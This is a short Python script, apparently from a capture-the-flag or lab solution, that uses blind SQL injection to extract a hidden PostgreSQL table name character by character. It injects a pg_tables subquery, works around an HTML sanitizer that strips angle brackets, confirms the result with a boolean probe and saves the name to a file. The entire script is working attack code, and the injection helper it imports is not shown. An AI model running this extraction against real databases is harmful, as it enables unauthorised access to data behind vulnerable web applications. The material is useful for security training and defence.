"""Extract the hidden table name (lowercase identifiers only) with noise control."""
import sys
import time
import solve

LOWER = list("abcdefghijklmnopqrstuvwxyz0123456789_")
# '<>' is swallowed by the app's HTML sanitizer, so the hidden table is taken as the
# last one alphabetically: 'planets' is not the maximum (verified with a probe).
EXPR = "(SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename DESC LIMIT 1)"

t0 = time.time()
name = solve.get_str(EXPR, cands=LOWER, echo=sys.stdout)
print("\n[*] table name: %r  (%d queries, %.0fs)" % (name, solve.Q["n"], time.time() - t0))
ok = solve.bit("%s = '%s'" % (EXPR, name))
print("[+] verified: %s" % ok)
open("hidden_table.txt", "w").write(name + "\n")
